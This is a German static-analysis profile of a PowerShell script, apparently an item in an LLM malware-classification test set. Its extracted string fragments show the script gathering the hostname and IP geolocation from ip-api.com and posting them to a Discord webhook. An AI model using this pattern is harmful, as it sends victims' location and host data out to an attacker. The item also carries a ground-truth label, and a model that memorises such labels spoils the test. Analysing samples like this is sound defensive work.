# Steckbrief: tech_028_Get-Geo.ps1

- SHA256: `025f2ed6643cc0eeb7ebe0c9c6ece8c71ce97bfe6a3bcc63f07b70b7f228256c`
- Groesse: 1952 Bytes, 53 Zeilen
- Ground-Truth-Label (aus Ordner): **techniques**
- Kein Urteil enthalten. Bewertung erfolgt durch das LLM.

## Stufe 1 - Reine Extraktion
- Strings gesamt: 6 (Auszug unten)
- Base64-Bloecke gesamt: 0, davon dekodierbar: 0
- Strings (Auszug):
  - `
    )

    $ipInfoApiUrl = `
  - `
    $hostname = [System.Net.Dns]::GetHostName()

    try {
        $response = Invoke-RestMethod -Uri $ipInfoApiUrl`
  - `) {
                $discordData = @{
                    'content' = `
  - `
                } | ConvertTo-Json

                Invoke-RestMethod -Uri $wb -Method Post -Body $discordData -Head`
  - `
        }
    }
    catch {
        Write-Error `
  - `
    }
}


#Get-Geo -wb `

## Stufe 2 - Statische Merkmale (zusaetzlich)
- URLs: `http://ip-api.com/json`
- Cmdlets: Content-Type, Get-Geo, Invoke-RestMethod, New-Object, Write-Error

## Stufe 3 - Struktur (zusaetzlich)
